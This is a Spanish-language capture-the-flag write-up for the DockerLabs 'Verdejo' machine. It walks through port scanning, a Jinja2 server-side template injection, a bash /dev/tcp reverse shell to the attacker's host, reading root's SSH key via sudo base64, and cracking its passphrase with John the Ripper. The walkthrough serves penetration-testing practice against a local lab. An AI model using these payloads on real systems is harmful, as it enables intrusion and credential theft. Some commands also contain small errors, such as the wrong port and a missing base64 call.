# [Verdejo](https://dockerlabs.es/)

## Despliegue

Primero desplegamos la máquina con ```bash auto_deploy.sh verdejo.tar``` (si no sabes en la página de DockerLabs ahí un pdf que lo explica).

<br>
<br>

## Reconocimiento

Una vez desplegada comprobamos que tenemos conectividad con ```ping -c 1 172.17.0.2``` 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/af4d0189-b640-4576-aca6-3c02c75c9434)
<br>
`-c 1` ⮞ solo lo repite una vez<br>
<br>
Ahora vamos con el reconocimiento de nmap ```nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts``` <br>
`-p-` ⮞ aplicar reconocimiento a todos los puertos <br>
`--open` ⮞ solo a los que esten abiertos <br>
`--min-rate 5000` ⮞ para enviar paquetes más rápido <br> 
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida <br> 
`-vvv` ⮞ conforme descubre un puerto nos lo muestra por pantalla <br> 
`-n` ⮞ no aplica la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro)<br> 
`-Pn` ⮞ ignora si esta activa o no la IP<br> 
`-oG` ⮞ exportamos el resultado en formato grepeable (para extraer mejor los datos con herramientas como grep, awk)
<br>

Podemos ver los reultados en el archivo grepeable haciendo ```cat allPorts```, observamos que tan solo está abierto el puerto **80**, **22**, **8089**
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/30e4a4c2-66ec-4fc4-b850-c5ed66365f4d)

<br>
<br>

## Página Web (Puerto 80)

Al ver que está abierto el puerto 80 nos dirigimos al Navegador Web e introducimos la dirección IP como URL. Nos encontramos con la pagina por defecto de Apache2. Si intentamos hacer fuzzing no tendremos resultados.

<br>
<br>

## Página Web (Puerto 8089)

Al no tener exito en el puerto 80, probamos a intentar acceder al puerto **8089** de la siguiente forma: `172.17.0.2:8090`. Se puede observar un recuadro para poner cosas.  
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/3b7a51a4-0d27-438a-9213-e131dbfc6de2)

<br>

Lo primero que se me ocurre es ver si es vulnerable a `SSTI`, una manera de comprobarlo es poniendo lo suiguiente `{{7*7}}`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/818083c0-b051-47d7-ab90-2a7d84d4273b)

<br>

Como observamos es vulnerable a SSTI por lo que deberíamos hacer ahora es buscar un payload el cual nos permita ejecutar comando de forma remota (RCE), por ejemplo en este [repositorio](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection) encontramos un montón de payloads pero el que nos interesa a nosotros es el de **Jinja2** que sería algo así: <br>

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` 
<br> 

Al introducir lo anterior comprobamos que nos responde con lo siguiente: 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/bcd2caeb-371c-4878-8b66-09a1c52599d8)

<br>

Por lo que ahora nos mandaríamos una revshell. Este parte se puede hacer de muchas formas. <br>
Una de ellas sería ponernos en escucha con netcat, escribiendo en nuestra terminal `nc -nlvp 443`, y despues en el payload en vez de poner el comando `id`, nos mandaremos una revshell poniendo lo siguiente: <br>

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/443 0>&1\'').read() }}` 

<br>
Es importante escapar las comillas simples ya que si no nos dará error.

<br>

Una vez mandada la revshell podemos ver que todo ha ido bien: 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/4e8a35d2-6b8c-496f-a88b-d53638c9a03e)

<br>
<br>

## Escala de Privilegios

Antes de empezar a probar como escalar privlegios haremos un sencillo tratamiento de la tty poniendo en orden lo suiguiente: <br>
`script /dev/null -c bash` <br>
`Pulsamos CTRL+Z` <br>
`stty raw -echo; fg` <br>
`reset xterm` <br>
`export SHELL=bash && export TERM=xterm` <br>

<br>

Una vez hecho el Tratamiento de la tty, podemos comenzar con la escala escribimos `sudo -l` podemos ver
que podemos ejecutar base64 siendo root sin proporcionar contraseña. <br>
`-l` ⮞ listar comandos que podemos ejecutar como sudo <br>

<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/bf198297-b8dd-4df1-947c-bc992e8b1dca)


<br>

Entonces mirando en [GTFOBins](https://gtfobins.github.io/) podemos ver que nos permite File Read poniendo lo siguiente -> `sudo base64 "file_to_read" | base64 --decode`. Entonces como recordamos que tiene el puerto 22 abierto es decir el ssh, podemos pobrar a leer la id_rsa del root que sería de la siguiente forma -> `sudo -u root /root/.ssh/id_rsa | base64 --decode`, por lo que visualizariamos la id_rsa del root por lo que nos la copiamos en un archivo en nuestro directorio de trabajo.

<br>
<br>

## JhonTheRipper

Una vez que tenemos la id_rsa si probamos a intentar logear como root a través del ssh de la siguiente forma -> `ssh -i id_rsa root@172.17.0.2`, nos pedirá una passphare la cual no tenemos por lo que pasaremos a crackear con JhonTheRipper. <br>

En primer lugar sacamos el hash de la id_rsa de la siguiente forma `ssh2john id_rsa > hash`, una vez que tenemos el hash pasamos a crackearlo para intentar sacar la passphare, lo haremos de la siguiente forma -> `john hash --wordlist=/usr/share/wordlist/rockyou.txt` y nos mostraría algo tal que así:

<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/1c2569dd-4f3a-435f-a99e-6ab421bbbb89)


<br>

Una vez que conocemos la passphare probamos a auntenticarnos como lo intentamos antes -> `ssh -i id_rsa root@172.17.0.2`, y despues introducimos la passphare y listo ya somos root!.

<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/3ff97e38-6c17-4410-a79e-016f9fe3c597)

